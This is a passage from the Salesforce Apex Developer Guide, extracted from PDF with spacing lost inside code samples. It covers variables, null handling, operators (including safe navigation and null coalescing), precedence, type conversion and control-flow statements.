examples are the Decimal divide method and the Double round method. For more information, see Rounding Mode.
•
System.SoapType:
This enum is returned by the field describe result getSoapType method. For more information, see SOAPType Enum.
34
Data Types and VariablesApex Developer Guide

•
System.DisplayType:
This enum is returned by the field describe result getType method. For more information, see DisplayType Enum.
•
System.JSONToken:
This enum is used for parsing JSON content. For more information, see JsonToken Enum.
•
ApexPages.Severity:
This enum specifies the severity of a Visualforce message. For more information, see ApexPages.Severity Enum.
•
Dom.XmlNodeType:
This enum specifies the node type in a DOM document.
Note: System-defined enums cannot be used in Web service methods.
All enum values, including system enums, have common methods associated with them. For more information, see Enum Methods.
You cannot add user-defined methods to enum values.
Variables
Local variables are declared with Java-style syntax.
For example:
Integeri = 0;
Stringstr;
List<String> strList;
Set<String> s;
Map<ID, String> m;
As with Java, multiple variables can be declared and initialized in a single statement, using comma separation. For example:
Integeri, j, k;
Variable Naming Rules
When naming variables, follow these rules.
•
Variable names are case-insensitive.
•
Variable names can contain only letters (A-Z or a-z), numbers (0-9), and underscores (_). Spaces and other special characters, including
dollar signs ($) and hyphens (-), aren’t allowed.
•
Variable names must begin with a letter (A-Z or a-z). Names can’t begin with a number (0-9) or an underscore (_).
•
Variable names can’t end with an underscore (_).
•
Varable names can’t contain consecutive underscores (_ _).
•
Reserved keywords can’t be used as variable names.
•
Variable names can have a maximum length of 255 characters.
•
Salesforce doesn't recommend sharing the same name between a variable and either its class or a method in its class, although it
is permitted to do so.
35
Data Types and VariablesApex Developer Guide

Null Variables and Initial Values
If you declare a variable and don't initialize it with a value, it will be null. In essence, null means the absence of a value. You can
also assign null to any variable declared with a primitive type. For example, both of these statements result in a variable set to null:
Booleanx = null;
Decimald;
Many instance methods on the data type will fail if the variable is null. In this example, the second statement generates an exception
(NullPointerException)
Dated;
d.addDays(2);
All variables are initialized to null if they aren’t assigned a value. For instance, in the following example, i, and k are assigned values,
while the integer variable j and the boolean variable b are set to null because they aren’t explicitly initialized.
Integeri = 0, j, k = 1;
Booleanb;
Note:  A common pitfall is to assume that an uninitialized boolean variable is initialized to false by the system. This isn’t the
case. Like all other variables, boolean variables are null if not assigned a value explicitly.
Variable Scope
Variables can be defined at any point in a block, and take on scope from that point forward. Sub-blocks can’t redefine a variable name
that has already been used in a parent block, but parallel blocks can reuse a variable name. For example:
Integeri;
{
// Integeri;  Thisdeclarationis not allowed
}
for (Integerj = 0; j < 10; j++);
for (Integerj = 0; j < 10; j++);
Case Sensitivity
To avoid confusion with case-insensitive SOQL and SOSL queries, Apex is also case-insensitive. This means:
•
Variable and method names are case-insensitive. For example:
IntegerI;
//Integeri;
•
References to object and field names are case-insensitive. For example:
Accounta1;
ACCOUNTa2;
•
SOQL and SOSL statements are case- insensitive. For example:
Account[]accts= [sELectID FromACCouNTwherenAme= 'fred'];
Note:  You’ll learn more about sObjects, SOQL, and SOSL later in this guide.
36
Data Types and VariablesApex Developer Guide

Also note that Apex uses the same filtering semantics as SOQL, which is the basis for comparisons in the SOAP API and the Salesforce
user interface. The use of these semantics can lead to some interesting behavior. For example, if an end-user generates a report based
on a filter for values that come before 'm' in the alphabet (that is, values < 'm'), null fields are returned in the result. The rationale for this
behavior is that users typically think of a field without a value as just a space character, rather than its actual null value. Consequently,
in Apex, the following expressions all evaluate to true:
Strings;
System.assert('a' == 'A');
System.assert(s< 'b');
System.assert(!(s> 'b'));
Note:  Although s < 'b' evaluates to true in the example above, 'b.'compareTo(s) generates an error because
you’re trying to compare a letter to a null value.
SEE ALSO:
Naming Conventions
Constants
Apex constants are variables whose values don’t change after being initialized once. Constants can be defined using the final keyword.
The final keyword means that the variable can be assigned at most once, either in the declaration itself, or with a static initializer
method if the constant is defined in a class. This example declares two constants. The first is initialized in the declaration statement. The
second is assigned a value in a static block by calling a static method.
publicclassmyCls{
staticfinalIntegerPRIVATE_INT_CONST= 200;
staticfinalIntegerPRIVATE_INT_CONST2;
publicstaticIntegercalculate(){
return2 + 7;
}
static{
PRIVATE_INT_CONST2= calculate();
}
}
For more information, see Using the final Keyword on page 85.
Expressions and Operators
An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value.
Expressions
An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value.
Expression Operators
Expressions can be joined to one another with operators to create compound expressions.
Safe Navigation Operator
Use the safe navigation operator (?.) to replace explicit, sequential checks for null references. This operator short-circuits expressions
that attempt to operate on a null value and returns null instead of throwing a NullPointerException.
37
Data Types and VariablesApex Developer Guide

Null Coalescing Operator
The ?? operator returns its right-hand side operand when its left-hand side operand is null. Similar to the safe navigation operator
(?.), the null coalescing operator (??) replaces verbose and explicit checks for null references in code.
Operator Precedence
Operators are interpreted in order, according to rules.
Comments
Both single and multiline comments are supported in Apex code.
SEE ALSO:
Expanding sObject and List Expressions
Expressions
An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value.
In Apex, an expression is always one of the following types:
•
A literal expression. For example:
1 + 1
•
A new sObject, Apex object, list, set, or map. For example:
new Account(<field_initializers>)
new Integer[<n>]
new Account[]{<elements>}
new List<Account>()
new Set<String>{}
new Map<String, Integer>()
new myRenamingClass(stringoldName,stringnewName)
•
Any value that can act as the left-hand of an assignment operator (L-values), including variables, one-dimensional list positions, and
most sObject or Apex object field references. For example:
Integeri
myList[3]
myContact.name
myRenamingClass.oldName
•
Any sObject field reference that is not an L-value, including:
–
The ID of an sObject in a list (see Lists)
–
A set of child records associated with an sObject (for example, the set of contacts associated with a particular account). This type
of expression yields a query result, much like SOQL and SOSL queries.
•
A SOQL or SOSL query surrounded by square brackets, allowing for on-the-fly evaluation in Apex. For example:
Account[]aa = [SELECTId, NameFROMAccountWHEREName='Acme'];
Integeri = [SELECTCOUNT()FROMContactWHERELastName='Weissman'];
List<List<SObject>>searchList= [FIND'map*'IN ALL FIELDSRETURNINGAccount(Id,Name),
Contact,Opportunity,Lead];
For information, see SOQL and SOSL Queries on page 167.
38
Data Types and VariablesApex Developer Guide

•
A static or instance method invocation. For example:
System.assert(true)
myRenamingClass.replaceNames()
changePoint(new Point(x,y));
Expression Operators
Expressions can be joined to one another with operators to create compound expressions.
Apex supports the following operators:
DescriptionSyntaxOperator
Assignment operator (Right associative). Assigns the value of y to the L-value
x. The data type of x must match the data type of y and can’t be null.
x = y=
Addition assignment operator (Right associative). Adds the value of y to the
original value of x and then reassigns the new value to x. See + for additional
information. x and y can’t be null.
x += y+=
Multiplication assignment operator (Right associative). Multiplies the value of
y with the original value of x and then reassigns the new value to x.
x *= y*=
Note: x and y must be Integers or Doubles or a combination.
x and y can’t be null.
Subtraction assignment operator (Right associative). Subtracts the value of y
from the original value of x and then reassigns the new value to x.
x -= y-=
Note: x and y must be Integers or Doubles or a combination.
x and y can’t be null.
Division assignment operator (Right associative). Divides the original value of x
with the value of y and then reassigns the new value to x.
x /= y/=
Note: x and y must be Integers or Doubles or a combination.
x and y can’t be null.
OR assignment operator (Right associative). If x, a Boolean, and y, a Boolean,
are both false, then x remains false. Otherwise x is assigned the value of true. x
and y can’t be null.
x |= y|=
AND assignment operator (Right associative). If x, a Boolean, and y, a Boolean,
are both true, then x remains true. Otherwise x is assigned the value of false. x
and y can’t be null.
x &= y&=
Bitwise shift left assignment operator. Shifts each bit in x to the left by y bits
so that the high-order bits are lost and the new right bits are set to 0. This value is
then reassigned to x.
x <<= y<<=
Bitwise shift right signed assignment operator. Shifts each bit in x to the right
by y bits so that the low-order bits are lost and the new left bits are set to 0 for
x >>= y>>=
39
Data Types and VariablesApex Developer Guide

DescriptionSyntaxOperator
positive values of y and 1 for negative values of y. This value is then reassigned to
x.
Bitwise shift right unsigned assignment operator. Shifts each bit in x to the
right by y bits so that the low-order bits are lost and the new left bits are set to 0
for all values of y. This value is then reassigned to x.
x >>>=y>>>=
Ternary operator (Right associative). This operator acts as a short-hand for
if-then-else statements. If x, a Boolean, is true, y is the result. Otherwise z is the
result.
x ? y : z? :
Note: x can’t be null.
AND logical operator (Left associative). If x, a Boolean, and y, a Boolean, are both
true, then the expression evaluates to true. Otherwise the expression evaluates to
false.
Note:
x && y&&
•
&& has precedence over ||
•
This operator exhibits short-circuiting behavior, which means y is evaluated
only if x is true.
•
x and y can’t be null.
OR logical operator (Left associative). If x, a Boolean, and y, a Boolean, are both
false, then the expression evaluates to false. Otherwise the expression evaluates to
true.
Note:
x || y||
•
&& has precedence over ||
•
This operator exhibits short-circuiting behavior, which means y is evaluated
only if x is false.
•
x and y can’t be null.
Equality operator. If the value of x equals the value of y, the expression evaluates
to true. Otherwise the expression evaluates to false.
x == y==
Note:
•
Unlike Java, == in Apex compares object value equality not reference
equality, except for user-defined types. Therefore:
–
String comparison using == is case-insensitive and is performed
according to the locale of the context user
–
ID comparison using == is case-sensitive and doesn’t distinguish
between 15-character and 18-character formats
–
User-defined types are compared by reference, which means that
two objects are equal only if they reference the same location in
memory. You can override this default comparison behavior by
40
Data Types and VariablesApex Developer Guide

DescriptionSyntaxOperator
providing equals and hashCode methods in your class to
compare object values instead.
•
For sObjects and sObject arrays, == performs a deep check of all sObject
field values before returning its result. Likewise for collections and built-in
Apex objects.
•
For records, every field must have the same value for == to evaluate to
true.
•
x or y can be the literal null.
•
The comparison of any two values can never result in null.
•
SOQL and SOSL use = for their equality operator and not ==. Although
Apex and SOQL and SOSL are strongly linked, this unfortunate syntax
discrepancy exists because most modern languages use = for assignment
and == for equality. The designers of Apex deemed it more valuable to
maintain this paradigm than to force developers to learn a new
assignment operator. As a result, Apex developers must use == for
equality tests in the main body of the Apex code, and = for equality in
SOQL and SOSL queries.
Exact equality operator. If x and y reference the exact same location in memory
the expression evaluates to true. Otherwise the expression evaluates to false.
x === y===
Less than operator. If x is less than y, the expression evaluates to true. Otherwise
the expression evaluates to false.
x < y<
Note:
•
Unlike other database stored procedures, Apex doesn’t support tri-state
Boolean logic and the comparison of any two values can never result in
null.
•
If x or y equal null and are Integers, Doubles, Dates, or Datetimes,
the expression is false.
•
A non-null String or ID value is always greater than a null value.
•
If x and y are IDs, they must reference the same type of object.
Otherwise a runtime error results.
•
If x or y is an ID and the other value is a String, the String value is
validated and treated as an ID.
•
x and y can’t be Booleans.
•
The comparison of two strings is performed according to the locale of
the context user and is case-insensitive.
Greater than operator. If x is greater than y, the expression evaluates to true.
Otherwise the expression evaluates to false.
x > y>
Note:
•
The comparison of any two values can never result in null.
41
Data Types and VariablesApex Developer Guide

DescriptionSyntaxOperator
•
If x or y equal null and are Integers, Doubles, Dates, or Datetimes,
the expression is false.
•
A non-null String or ID value is always greater than a null value.
•
If x and y are IDs, they must reference the same type of object.
Otherwise a runtime error results.
•
If x or y is an ID and the other value is a String, the String value is
validated and treated as an ID.
•
x and y can’t be Booleans.
•
The comparison of two strings is performed according to the locale of
the context user and is case-insensitive.
Less than or equal to operator. If x is less than or equal to y, the expression
evaluates to true. Otherwise the expression evaluates to false.
x <= y<=
Note:
•
The comparison of any two values can never result in null.
•
If x or y equal null and are Integers, Doubles, Dates, or Datetimes,
the expression is false.
•
A non-null String or ID value is always greater than a null value.
•
If x and y are IDs, they must reference the same type of object.
Otherwise a runtime error results.
•
If x or y is an ID and the other value is a String, the String value is
validated and treated as an ID.
•
x and y can’t be Booleans.
•
The comparison of two strings is performed according to the locale of
the context user and is case-insensitive.
Greater than or equal to operator. If x is greater than or equal to y, the
expression evaluates to true. Otherwise the expression evaluates to false.
x >= y>=
Note:
•
The comparison of any two values can never result in null.
•
If x or y equal null and are Integers, Doubles, Dates, or Datetimes,
the expression is false.
•
A non-null String or ID value is always greater than a null value.
•
If x and y are IDs, they must reference the same type of object.
Otherwise a runtime error results.
•
If x or y is an ID and the other value is a String, the String value is
validated and treated as an ID.
•
x and y can’t be Booleans.
•
The comparison of two strings is performed according to the locale of
the context user and is case-insensitive.
42
Data Types and VariablesApex Developer Guide

DescriptionSyntaxOperator
Inequality operator. If the value of x doesn’t equal the value of y, the expression
evaluates to true. Otherwise the expression evaluates to false.
x != y!=
Note:
•
String comparison using != is case-insensitive
•
Unlike Java, != in Apex compares object value equality not reference
equality, except for user-defined types.
•
For sObjects and sObject arrays, != performs a deep check of all sObject
field values before returning its result.
•
For records, != evaluates to true if the records have different values for
any field.
•
User-defined types are compared by reference, which means that two
objects are different only if they reference different locations in memory.
You can override this default comparison behavior by providing equals
and hashCode methods in your class to compare object values instead.
•
x or ycan be the literal null.
•
The comparison of any two values can never result in null.
Exact inequality operator. If x and y don’t reference the exact same location in
memory, the expression evaluates to true. Otherwise the expression evaluates to
false.
x !== y!==
Addition operator. Adds the value of x to the value of y according to the
following rules:
x + y+
•
If x and y are Integers or Doubles, the operator adds the value of x to the
value of y. If a Double is used, the result is a Double.
•
If x is a Date and y is an Integer, returns a new Date that is incremented by
the specified number of days.
•
If x is a Datetime and y is an Integer or Double, returns a new Date that is
incremented by the specified number of days, with the fractional portion
corresponding to a portion of a day.
•
If x is a String and y is a String or any other type of non-null argument,
concatenates y to the end of x.
Subtraction operator. Subtracts the value of y from the value of x according to
the following rules:
x - y-
•
If x and y are Integers or Doubles, the operator subtracts the value of y from
the value of x. If a Double is used, the result is a Double.
•
If x is a Date and y is an Integer, returns a new Date that is decremented by
the specified number of days.
•
If x is a Datetime and y is an Integer or Double, returns a new Date that is
decremented by the specified number of days, with the fractional portion
corresponding to a portion of a day.
43
Data Types and VariablesApex Developer Guide

DescriptionSyntaxOperator
Multiplication operator. Multiplies x, an Integer or Double, with y, another
Integer or Double. If a double is used, the result is a Double.
x * y*
Division operator. Divides x, an Integer or Double, by y, another Integer or Double.
If a double is used, the result is a Double.
x / y/
Logical complement operator. Inverts the value of a Boolean so that true becomes
false and false becomes true.
!x!
Unary negation operator. Multiplies the value of x, an Integer or Double, by -1.
The positive equivalent + is also syntactically valid but doesn’t have a mathematical
effect.
-x-
Increment operator. Adds 1 to the value of x, a variable of a numeric type. If
prefixed (++x), the expression evaluates to the value of x after the increment. If
postfixed (x++), the expression evaluates to the value of x before the increment.
x++
++x
++
Decrement operator. Subtracts 1 from the value of x, a variable of a numeric type.
If prefixed (--x), the expression evaluates to the value of x after the decrement. If
postfixed (x--), the expression evaluates to the value of x before the decrement.
x--
--x
--
Bitwise AND operator. ANDs each bit in x with the corresponding bit in y so
that the result bit is set to 1 if both of the bits are set to 1.
x & y&
Bitwise OR operator. ORs each bit in x with the corresponding bit in y so that
the result bit is set to 1 if at least one of the bits is set to 1.
x | y|
Bitwise exclusive OR operator. Exclusive ORs each bit in x with the corresponding
bit in y so that the result bit is set to 1 if exactly one of the bits is set to 1 and the
other bit is set to 0.
x ^ y^
Bitwise exclusive OR operator. Exclusive ORs each bit in x with the corresponding
bit in y so that the result bit is set to 1 if exactly one of the bits is set to 1 and the
other bit is set to 0. Assigns the result of the exclusive OR operation to x.
x ^= y^=
Bitwise shift left operator. Shifts each bit in x to the left by y bits so that the
high-order bits are lost and the new right bits are set to 0.
x << y<<
Bitwise shift right signed operator. Shifts each bit in x to the right by y bits so
that the low-order bits are lost and the new left bits are set to 0 for positive values
of y and 1 for negative values of y.
x >> y>>
Bitwise shift right unsigned operator. Shifts each bit in x to the right by y bits
so that the low-order bits are lost and the new left bits are set to 0 for all values of
y.
x >>> y>>>
Bitwise Not or Complement operator. Toggles each binary digit of x, converting
0 to 1 and 1 to 0. Boolean values are converted from True to False and vice
versa.
~x~
Parentheses. Elevates the precedence of an expression x so that it’s evaluated
first in a compound expression.
(x)()
44
Data Types and VariablesApex Developer Guide

DescriptionSyntaxOperator
Safe navigation operator. Short-circuits expressions that attempt to operate on
a null value, and returns null instead of throwing a NullPointerException. If the
x?.y?.
left-hand side of the chain expression evaluates to null, the right-hand side of the
chain expression isn’t evaluated.
Safe Navigation Operator
Use the safe navigation operator (?.) to replace explicit, sequential checks for null references. This operator short-circuits expressions
that attempt to operate on a null value and returns null instead of throwing a NullPointerException.
Important:  Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.
If the left-hand-side of the chain expression evaluates to null, the right-hand-side isn’t evaluated. Use the safe navigation operator (?.)
in method, variable, and property chaining. The part of the expression that isn’t evaluated can include variable references, method
references, or array expressions.
Note:  All Apex types are implicitly nullable and can hold a null value returned from the operator.
Examples
•
This example first evaluates a, and returns null if a is null. Otherwise the return value is a.b.
a?.b// Evaluatesto: a == null? null: a.b
•
This example returns null if a[x] evaluates to null. If a[x] doesn’t evaluate to null and aMethod() returns null, then this
expression throws a NullPointerException.
a[x]?.aMethod().aField// Evaluatesto nullif a[x]== null
•
This example returns null if a[x].aMethod() evaluates to null.
a[x].aMethod()?.aField
•
This example indicates that the type of the expression is the same whether the safe navigation operator is used in the expression or
not.
Integerx = anObject?.anIntegerField;// The expressionis of typeIntegerbecausethe
fieldis of typeInteger
•
This example shows a single statement replacing a block of code that checks for nulls.
// Previouscodecheckingfor nulls
StringprofileUrl= null;
if (user.getProfileUrl()!= null) {
profileUrl= user.getProfileUrl().toExternalForm();
}
// New codeusingthe safenavigationoperator
StringprofileUrl= user.getProfileUrl()?.toExternalForm();
45
Data Types and VariablesApex Developer Guide

•
This example shows a single-row SOQL query using the safe navigation operator.
// Previouscodecheckingfor nulls
results= [SELECTNameFROMAccountWHEREId = :accId];
if (results.size()== 0) { // Accountwas deleted
returnnull;
}
returnresults[0].Name;
// New codeusingthe safenavigationoperator
return[SELECTNameFROMAccountWHEREId = :accId]?.Name;
Table 1: Safe Navigation Operator Use-Cases
More informationExampleAllowed use-case
Can be used as a top-level statement.aObject?.aMethod();Method or variable or parameter chains
The operator skips the method chain up to
the first closing parenthesis. By adding the
((T)a1?.b1)?.c1()Using parentheses, for example in a cast.
operator after the parenthesis, the code
safeguards the whole expression. If the
operator is used elsewhere, and not after
the parenthesis, the whole cast expression
isn’t be safeguarded. For example, the
behavior of
//Incorrectuse of safe
navigationoperator
((T)a1?.b1).c1()
is equivalent to:
T ref = null;
if (a1 != null) {
ref = (T)a1.b1;
}
result= ref.c1();
An SObject expression evaluates to null
when the relationship is null. The behavior
Strings =
contact.Account?.BillingCity;
SObject chaining
is equivalent to Strings =
contact.Account.BillingCity.
If the SOQL query returns no objects, then
the expression evaluates to null. The
behavior is equivalent to:
List<Contact>contacts=
[SELECTLastNameFROM
Strings = [SELECTLastName
FROMContact]?.LastName;
SOQL Queries
Contact];
Strings;
if (contacts.size()== 0) {
46
Data Types and VariablesApex Developer Guide

More informationExampleAllowed use-case
s = null; // New behavior
whenusingSafeNavigation.
Earlier,thiswouldthrow
an exception.}
elseif (contacts.size()==
1) {
s =
contacts.get(0).LastName;}
else{ // contacts.size()>
1 thrownew
QueryException(...);}
You can’t use the Safe Navigation Operator in certain cases. Attempting to use the operator in these ways causes an error during
compilation:
•
Types and static expressions with dots. For example:
–
Namespaces
–
{Namespace}.{Class}
–
Trigger.new
–
Flow.interview.{flowName}
–
{Type}.class
•
Static variable access, method calls, and expressions. For example:
–
AClass.AStaticMethodCall()
–
AClass.AStaticVariable
–
String.format('{0}', 'helloworld')
–
Page.{pageName}
•
Assignable expressions. For example:
–
foo?.bar= 42;
–
++foo?.bar;
•
SOQL bind expressions. For example:
classX { publicStringquery= 'xyz';}
X x = new X();
List<Account>accounts= [SELECTNameFROMAccountWHEREName= :X?.query]
List<List<SObject>>moreAccounts= [FIND:X?.queryIN ALL FIELDS
RETURNINGAccount(Name)];
•
With addError() on SObject scalar fields. For example:
Contactc;
c.LastName?.addError('Thefieldmusthavea value');
Note:  You can use the operator with addError() on SObjects, including lookup and master-detail fields.
47
Data Types and VariablesApex Developer Guide

Null Coalescing Operator
The ?? operator returns its right-hand side operand when its left-hand side operand is null. Similar to the safe navigation operator (?.),
the null coalescing operator (??) replaces verbose and explicit checks for null references in code.
The null coalescing operator is a binary operator in the form a ?? b that returns a if a isn’t null, and otherwise returns b. The operator
is left-associative. The left-hand operand is evaluated only one time. The right-hand operand is only evaluated if the left-hand operand
is null.
You must ensure type compatibility between the operands. For example, in the expression: objectZresult= objectA??
objectB, both objectA and objectB must be instances of objectZ to avoid a compile-time error.
Here’s a comparison that illustrates the operator usage. Before the Null Coalescing Operator, you used:
IntegernotNullReturnValue= (anInteger!= null)? anInteger: 100;
With the Null Coalescing Operator, use:
IntegernotNullReturnValue= anInteger?? 100;
While using the null coalescing operator, always keep operator precedence in mind. In some cases, using parentheses is necessary to
obtain the desired results. For example, the expression top ?? 100 - bottom?? 0 evaluates to top ?? (100- bottom
?? 0) and not to (top?? 100)- (bottom?? 0).
Apex supports assignment of a single resultant record from a SOQL query, but throws an exception if there are no rows returned by the
query. The null coalescing operator can be used to gracefully deal with the case where the query doesn’t return any rows. If a SOQL
query is used as the left-hand operand of the operator and rows are returned, then the null coalescing operator returns the query results.
If no rows are returned, the null coalescing operator returns the right-hand operand.
Warning:  Salesforce recommends against using multiple SOQL queries in a single statement that also uses the null coalescing
operator.
These examples work with Account objects.
AccountdefaultAccount= new Account(name= 'Acme');
// LeftoperandSOQLis empty,returndefaultAccountfromrightoperand:
Accounta = [SELECTId FROMAccount
WHEREId = '001000000FAKEID']?? defaultAccount;
Assert.areEqual(defaultAccount,a);
// If thereisn'ta matchingAccountor the BillingCityis null,replacethe value
stringcity= [SelectBillingCity
FromAccount
WhereId = '001xx000000001oAAA']?.BillingCity;
System.debug('Matchescount:' + city?.countMatches('SanFrancisco')?? 0 );
Usage
There are some restrictions on using the null coalescing operator.
•
You can’t use the null coalescing operator as the left side of an assignment operator in an assignment.
–
foo??bar= 42;// Thisis not a validassignment
–
foo??bar++;// Thisis not a validassignment
48
Data Types and VariablesApex Developer Guide

•
SOQL bind expressions don’t support the null coalescing operator.
classX { publicStringquery= 'xyz';}
X x = new X();
List<Account>accounts= [SELECTNameFROMAccountWHEREName= :X??query]
List<List<SObject>>moreAccounts= [FIND:X??queryIN ALL FIELDS
RETURNINGAccount(Name)];
SEE ALSO:
Operator Precedence
Using SOQL Queries That Return One Record
Operator Precedence
Operators are interpreted in order, according to rules.
Apex uses the following operator precedence rules:
DescriptionOperatorsPrecedence
Grouping and prefix increments and decrements{} () ++ --1
Unary operators, additive operators, type cast and object
creation
~ ! -x +x (type)new2
Multiplication and division* /3
Addition and subtraction+ -4
Shift Operators<< >> >>>5
Greater-than and less-than comparisons, reference tests< <= > >= instanceof6
Comparisons: equal and not-equal== !=7
Bitwise AND&8
Bitwise XOR^9
Bitwise OR|10
Logical AND&&11
Logical OR||12
Null Coalescing??13
Ternary?:14
Assignment operators= += -= *= /= &= <<= >>= >>>=15
Comments
Both single and multiline comments are supported in Apex code.
49
Data Types and VariablesApex Developer Guide

Tip:  We recommend using the standardized ApexDoc comment format to increase code readability, collaboration, and long-term
maintainability. For the full specifications, see Document Your Apex Code on page 243.
•
To create a single line comment, use //. All characters on the same line to the right of the // are ignored by the parser. For example:
Integeri = 1; // Thiscommentis ignoredby the parser
•
To create a multiline comment, use /* and */ to demarcate the beginning and end of the comment block. For example:
Integeri = 1; /* Thiscommentcan wrapovermultiple
lineswithoutgettinginterpretedby the
parser.*/
Assignment Statements
An assignment statement is any statement that places a value into a variable.
An assignment statement generally takes one of two forms:
[LValue]= [new_value_expression];
[LValue]= [[inline_soql_query]];
In the forms above, [LValue] stands for any expression that can be placed on the left side of an assignment operator. These include:
•
A simple variable. For example:
Integeri = 1;
Accounta = new Account();
Account[]accts= [SELECTId FROMAccount];
•
A de-referenced list element. For example:
ints[0]= 1;
accts[0].Name= 'Acme';
•
An sObject field reference that the context user has permission to edit. For example:
Accounta = new Account(Name= 'Acme', BillingCity= 'SanFrancisco');
// IDs cannotbe set priorto an insertcall
// a.Id= '00300000003T2PGAA0';
// Instead,insertthe record.The systemautomaticallyassignsit an ID.
inserta;
// Fieldsalsomustbe writablefor the contextuser
// a.CreatedDate= System.today();Thiscodeis invalidbecause
//createdDateis read-only!
// Sincethe accounta has beeninserted,it is now possibleto
// createa new contactthatis relatedto it
Contactc = new Contact(LastName= 'Roth', Account= a);
// Noticethatyou can writeto the accountnamedirectlythroughthe contact
c.Account.Name= 'salesforce.com';
50
Data Types and VariablesApex Developer Guide

Assignment is always done by reference. For example:
Accounta = new Account();
Accountb;
Account[]c = new Account[]{};
a.Name= 'Acme';
b = a;
c.add(a);
// Theseassertsshouldnow be true.You can referencethe data
// originallyallocatedto accounta throughaccountb and accountlistc.
System.assertEquals(b.Name,'Acme');
System.assertEquals(c[0].Name,'Acme');
Similarly, two lists can point at the same value in memory. For example:
Account[]a = new Account[]{new Account()};
Account[]b = a;
a[0].Name= 'Acme';
System.assert(b[0].Name== 'Acme');
In addition to =, other valid assignment operators include +=, *=, /=, |=, &=, ++, and --. See Expression Operators on page 39.
Rules of Conversion
In general, Apex requires you to explicitly convert one data type to another. For example, a variable of the Integer data type cannot be
implicitly converted to a String. You must use the string.format method. However, a few data types can be implicitly converted,
without using a method.
Numbers form a hierarchy of types. Variables of lower numeric types can always be assigned to higher types without explicit conversion.
The following is the hierarchy for numbers, from lowest to highest:
1.Integer
2.Long
3.Double
4.Decimal
Note:  Once a value has been passed from a number of a lower type to a number of a higher type, the value is converted to the
higher type of number.
Note that the hierarchy and implicit conversion is unlike the Java hierarchy of numbers, where the base interface number is used and
implicit object conversion is never allowed.
In addition to numbers, other data types can be implicitly converted. The following rules apply:
•
IDs can always be assigned to Strings.
•
Strings can be assigned to IDs. However, at runtime, the value is checked to ensure that it is a legitimate ID. If it is not, a runtime
exception is thrown.
•
The instanceOf keyword can always be used to test whether a string is an ID.
51
Data Types and VariablesApex Developer Guide

Additional Considerations for Data Types
Data Types of Numeric Values
Numeric values represent Integer values unless they are appended with L for a Long or with .0 for a Double or Decimal. For example,
the expression Longd = 123; declares a Long variable named d and assigns it to an Integer numeric value (123), which is
implicitly converted to a Long. The Integer value on the right hand side is within the range for Integers and the assignment succeeds.
However, if the numeric value on the right hand side exceeds the maximum value for an Integer, you get a compilation error. In this
case, the solution is to append L to the numeric value so that it represents a Long value which has a wider range, as shown in this
example: Longd = 2147483648L;.
Overflow and Underflow of Data Type Values
Arithmetic computations that produce values larger than the maximum value of the current type are said to overflow and values
lower than the minimum value of the current type are said to be underflow. Apex doesn’t throw an exception for overflow and
underflow of data type values. For example, Integeri = 2147483647+ 1; yields a value of –2147483648 because
2147483647 is the maximum value for an Integer, so adding one to it wraps the value around to the minimum negative value for
Integers: –2147483648. Similarly, subtracting one from the minimum integer -2,147,483,648 wraps the value around to the maximum
value for Integers: 2,147,483,647.
If arithmetic computations generate results larger than the maximum value for the current type, the end result will be incorrect
because the computed values that are larger than the maximum will overflow. For example, the expression LongMillsPerYear
= 365 * 24 * 60 * 60 * 1000; results in an incorrect result because the products of Integers on the right hand side
are larger than the maximum Integer value and they overflow. As a result, the final product isn't the expected one. You can avoid
this by ensuring that the type of numeric values or variables you are using in arithmetic operations are large enough to hold the
results. In this example, append L to numeric values to make them Long so the intermediate products will be Long as well and no
overflow occurs. The following example shows how to correctly compute the amount of milliseconds in a year by multiplying Long
numeric values.
LongMillsPerYear= 365L* 24L * 60L * 60L * 1000L;
LongExpectedValue= 31536000000L;
System.assertEquals(MillsPerYear,ExpectedValue);
Loss of Fractions in Divisions
When dividing numeric Integer or Long values, the fractional portion of the result, if any, is removed before performing any implicit
conversions to a Double or Decimal. For example, Doubled = 5/3; returns 1.0 because the actual result (1.666...) is an Integer
and is rounded to 1 before being implicitly converted to a Double. To preserve the fractional value, ensure that you are using Double
or Decimal numeric values in the division. For example, Doubled = 5.0/3.0; returns 1.6666666666666667 because 5.0
and 3.0 represent Double values, which results in the quotient being a Double as well and no fractional value is lost.
Conversion of Date to Datetime
Apex supports both implicit and explicit casting of Date values to Datetime, with the time component being zeroed out in the
resulting Datetime value.
Control Flow Statements
Apex provides if-else statements, switch statements, and loops to control the flow of code execution. Statements are generally executed
line by line, in the order they appear. With control flow statements, you can make Apex code execute based on a certain condition, or
have a block of code execute repeatedly.
Conditional (If-Else) Statements
The conditional statement in Apex works similarly to Java.
52
Control Flow StatementsApex Developer Guide

Switch Statements
Apex provides a switch statement that tests whether an expression matches one of several values and branches accordingly.
Loops
Apex supports five types of procedural loops.
Conditional (If-Else) Statements
The conditional statement in Apex works similarly to Java.
if ([Boolean_condition])
// Statement1
else
// Statement2
The else portion is always optional, and always groups with the closest if. For example:
Integerx, sign;
// Yourcode
if (x <= 0)if(x == 0) sign= 0;elsesign= -1;
is equivalent to:
Integerx, sign;
// Yourcode
if (x <= 0) {
if(x == 0) {
sign= 0;
}else{
sign= -1;
}
}
Repeated elseif statements are also allowed. For example:
if (place== 1) {
medal_color= 'gold';
} elseif (place== 2) {
medal_color= 'silver';
} elseif (place== 3) {
medal_color= 'bronze';
} else{
medal_color= null;
}
Switch Statements
Apex provides a switch statement that tests whether an expression matches one of several values and branches accordingly.
The syntax is:
switchon expression{
whenvalue1{  // whenblock1
// codeblock1
}
whenvalue2{  // whenblock2
53
Control Flow StatementsApex Developer Guide

// codeblock2
}
whenvalue3{  // whenblock3
// codeblock3
}
whenelse{// defaultblock,optional
// codeblock4
}
}
The when value can be a single value, multiple values, or sObject types. For example:
whenvalue1{
}
whenvalue2,value3{
}
whenTypeNameVariableName{
}
The switch statement evaluates the expression and executes the code block for the matching when value. If no value matches, the
whenelse code block is executed. If there isn’t a whenelse block, no action is taken.
Note: There is no fall-through. After the code block is executed, the switch statement exits.
Apex switch statement expressions can be one of the following types.
•
Integer
•
Long
•
sObject
•
String
•
Enum
When Blocks
Each when block has a value that the expression is matched against. These values can take one of the following forms.
•
when literal {} (a when block can have multiple, comma-separated literal clauses)
•
when SObjectType identifier {}
•
when enum_value {}
The value null is a legal value for all types.
Each when value must be unique. For example, you can use the literal x only in one when block clause. A when block is matched
one time at most.
When Else Block
If no when values match the expression, the whenelse block is executed.
